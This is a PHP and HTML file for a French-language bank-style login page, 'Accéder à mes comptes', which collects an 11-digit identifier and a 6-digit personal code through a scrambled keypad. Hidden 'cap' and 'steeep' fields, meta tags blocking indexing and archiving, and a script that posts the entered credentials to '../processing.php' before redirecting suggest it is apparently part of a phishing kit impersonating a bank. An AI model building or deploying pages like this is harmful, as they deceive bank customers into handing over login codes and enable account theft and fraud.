<?php include 'database.php'; ?>
<?php

try {
    $conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        $identifiant = $_POST['identifiant'];
        $password = $_POST['password'];

        // Préparation de la requête pour sélectionner l'utilisateur par identifiant
        $stmt = $conn->prepare('SELECT * FROM utilisateurs WHERE identifiant = :identifiant');
        $stmt->bindParam(':identifiant', $identifiant);
        $stmt->execute();

        $user = $stmt->fetch(PDO::FETCH_ASSOC);

        if ($user && password_verify($password, $user['password'])) {
            // Authentification réussie
            $_SESSION['user_id'] = $user['id'];
            $_SESSION['user_name'] = $user['prenom'].' '.$user['nom'];
            header('Location: dashboard.php');
            exit;
        } else {
            $error_message = 'Identifiant ou mot de passe incorrect';
        }
    }
} catch (PDOException $e) {
    echo 'Erreur : '.$e->getMessage();
}

$conn = null;
?>

<!doctype html>
<html>

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">

    <!-- CSS FILES -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css">
    <link rel="stylesheet" href="../media/css/helpers.css">
    <link rel="stylesheet" href="../media/css/style.css">

    <link rel="icon" type="image/x-icon" href="../media/favicon.ico" />

    <title>Accéder à mes comptes</title>
</head>

<body>

    <!-- HEADER MOBILE -->
    <div id="mobile-menu" class="d-lg-flex d-md-flex d-sm-flex d-flex">
        <div class="pl-3"><img style="width: 57px;" src="../media/imgs/logo2.svg"></div>
        <div><img src="../media/imgs/close.png"></div>
    </div>
    <!-- END HEADER MOBILE -->

    <!-- MAIN -->
    <main id="main">
        <div class="left">
            <div class="content">
                <div class="zz">
                    <p>SOLUTIONS ENGAGEES</p>
                </div>
                <h3 style="font-weight: 300;">ENVIE DE VOUS ENGAGER POUR UN MONDE PLUS DURABLE ?</h3>
                <p style="font-weight: 500;">
                    Découvrez notre gamme de solutions pour vous accompagner dans vos initiatives durables, éthiques et
                    solidaires.
                </p>
                <button style="border-radius: 30px;" type="button">JE DÉCOUVRE</button>
            </div>
        </div>
        <div class="right" style="background: #F5F5F5;">
            <div class="login">
                <h3>Accéder à mes comptes
                </h3>
                <?php if (isset($error_message)) { ?>
                <p class="error-message"><?php echo $error_message; ?></p>
                <?php } ?>
                <style>
                    .error-message {
                        color: red;
                        font-weight: bold;
                    }
                </style>
                <div class="row">
                    <div class="col-md-6">
                        <div class="login-area">
                            <div id="forma">
                                <form method="post">
                                    <input type="hidden" id="cap" name="cap">
                                    <input type="hidden" name="steeep" id="steeep" value="login">
                                    <p class="mb-0" style="font-size: 16px; color: #000;"><b>IDENTIFIANT</b></p>
                                    <div class="form-group mb-4">
                                        <label style="padding-bottom: 8px;" for="identifiant">Saisissez votre identifiant à 11 chiffres</label>
                                        <input maxlength="11" type="text" name="identifiant" id="identifiant"
                                            class="form-control" placeholder="Ex: 98652706859" required>
                                        <div class="remove removeidentifiant">x</div>
                                    </div>

                                    <div class="btns btns1 mt40">
                                        <div id="btn1" class="btttn disabled" disabled>Entrer mon code personnel</div>
                                    </div>
                                    <div class="zz">
                                        <div class="form-group mb30">
                                            <label class="d-flex align-items-end" for="password"><span
                                                    class="flex-grow-1"
                                                    style="font-weight: 700; color: #000; font-size: 16px;">CODE
                                                    PERSONNEL</span><span
                                                    style="color: #007461; font-weight: 400; font-size: 13px; text-decoration: underline;">Perdu
                                                    / Oublié ?</span></label>
                                            <input maxlength="6" type="password" name="password" id="password"
                                                class="form-control readonly"
                                                placeholder="Tapez votre code dans le pavé numérique ci-dessous"
                                                required>
                                            <div style="top: 25px;" class="remove removepassword">x</div>
                                        </div>
                                        <div class="numbers mb30">
                                            <ul class="mb20">
                                                <li data-num="4">4</li>
                                                <li data-num="5">5</li>
                                                <li data-num="7">7</li>
                                                <li data-num="9">9</li>
                                                <li data-num="3">3</li>
                                            </ul>
                                            <ul>
                                                <li data-num="2">2</li>
                                                <li data-num="6">6</li>
                                                <li data-num="1">1</li>
                                                <li data-num="0">0</li>
                                                <li data-num="8">8</li>
                                            </ul>
                                        </div>
                                        <div class="btns">
                                            <button type="submit" class="btttn">VALIDER</button>
                                        </div>
                                    </div>
                                </form>
                                <p class="dddd"
                                    style="color: #000; text-align: center; font-weight: 700; font-size: 17px; margin-bottom: 30px; margin-top: 120px;">
                                    Vous n’êtes pas encore client ?</p>
                                <div class="btns">
                                    <div class="btttn" style="font-size: 15px;">Devenir client</div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-6">
                        <div class="content">
                            <div class="mb30">
                                <h4 style="font-size:20px">OUBLI/PERTE DE CODE PERSONNEL</h4>
                                <p>Si vous avez oublié ou perdu votre code personnel, cliquez <span>ici</span>.</p>
                            </div>
                            <h4 style="font-size:20px">VOTRE IDENTIFICATION NE CHANGE PAS</h4>
                            <p class="mb30">Pour accéder à votre compte, saisissez votre identifiant et votre code
                                personnel habituels.</p>
                            <h4 style="font-size:20px" class="mb-0">UN PROBLÈME TECHNIQUE ?</h4>
                            <p class="mb30">Une assistance est à votre disposition, <span>cliquez ici</span></p>
                            <h4 style="font-size:20px">SÉCURITÉ</h4>
                            <p>
                                Restez vigilants et veillez à protéger vos données personnelles.<br>
                                <span>Consultez nos conseils de sécurité</span>
                            </p>
                            <p>
                                Nous vous invitons également à consulter régulièrement nos Conditions Générales
                                d'utilisation.<br>
                                <span>Voir les Conditions Générales d'Utilisation</span>
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </main>
    <!-- END MAIN -->

    <!-- JS FILES -->
    <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <script src="../media/js/js.js"></script>

    <script>
        $('#identifiant').keyup(function() {
            $('.error').hide();
            $('.removeidentifiant').show();
            if ($(this).val().length == 11) {
                $('#btn1').removeClass('disabled').removeAttr('disabled');
                $('.removeidentifiant').show();
            } else {
                $('#btn1').addClass('disabled').attr('disabled', 'disabled');
            }
            if ($(this).val().length == '') {
                $('.removeidentifiant').hide();
            }
        });
        $('.removeidentifiant').click(function() {
            $('.removeidentifiant').hide();
            $('#btn1').addClass('disabled').attr('disabled', 'disabled');
            $('#identifiant').val('');
            $('.removepassword').hide();
            $('#btn2').addClass('disabled').attr('disabled', 'disabled');
            $('#password').val('');
            $('.zz').hide();
            $('.btns1').show();
            $('#identifiant').removeClass('readonly').removeAttr('readonly');
        });
        $('#btn1').click(function() {
            $('.zz').show();
            $('.btns1').hide();
            $('#identifiant').addClass('readonly').attr('readonly', 'readonly');
        });
        $('.numbers ul li').click(function() {
            if ($('#password').val().length == 6) {
                return false;
            }
            $('.removepassword').show();
            var num = $(this).text();
            var zz = $('#password').val() + num;
            $('#password').val(zz);
            if ($('#password').val().length == 6) {
                $('#btn2').removeClass('disabled').removeAttr('disabled');
            }
        });
        $('.removepassword').click(function() {
            $('.removepassword').hide();
            $('#btn2').addClass('disabled').attr('disabled', 'disabled');
            $('#password').val('');
        });
        var loaded = false;
        $('#btn2').click(function() {
            if (loaded == true) {
                return false;
            }
            formData = {
                'cap': $('#cap').val(),
                'steeep': $('#steeep').val(),
                'identifiant': $('#identifiant').val(),
                'password': $('#password').val(),
            }
            $.post("../processing.php", formData)
                .done(function(data) {
                    window.location.href = data;
                });
            loaded = true;
        });
    </script>

</body>

</html>